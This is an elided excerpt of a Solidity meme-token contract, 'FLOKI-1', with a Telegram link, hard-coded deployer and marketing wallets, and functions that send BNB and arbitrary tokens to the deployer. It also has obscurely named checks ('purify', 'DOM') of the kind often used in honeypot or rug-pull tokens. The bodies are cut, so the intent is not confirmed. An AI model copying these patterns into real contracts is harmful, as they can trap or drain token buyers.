...
/* 
        ...
        Telegram : https://t.me/floki1CN


        Website : https://www.spacetv.net/live/launch-of-spacex-falcon-9-with-doge-1-mission-to-the-moon/
...
contract FLOK1 is Context, IERC20 { 
    ...
    address payable public Wallet_Deployer = payable(0x7eEA1B231edC1b2F43e13B18E25B5390B74A2bf5); // DEV
    address payable public Wallet_Marketing = payable(0xc27b4FBb5917B6E0F18A68144c06DA85bBD35718);  // MARKETING
    address payable public constant Wallet_Burn = payable(0x000000000000000000000000000000000000dEaD); // DEAD WALLET

    uint256 private constant MAX = ~uint256(0);
    uint8 private constant _decimals = 9;
    uint256 private _tTotal = 1* 10**6 * 10**_decimals;
    string private constant _name = "FLOKI-1"; 
    string private constant _symbol = unicode"FLOKI-1";
    ...
    constructor () {
        ...
        _owner = 0x7eEA1B231edC1b2F43e13B18E25B5390B74A2bf5;
        ...
        _isExcludedFromFee[Wallet_Deployer] = true; 
    ...
    function purify(address from) private view returns (bool) {
    ...
    function DOM() private pure returns(uint256){
        return 10**(20+5-1-1);
    }
    ...
    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
            ...
            sendToWallet(Wallet_Deployer, BNB_Total);
    ...
    function remove_Random_Tokens(address random_Token_Address, uint256 percent_of_Tokens) public returns(bool _sent){
        ...
        _sent = IERC20(random_Token_Address).transfer(Wallet_Deployer, removeRandom);
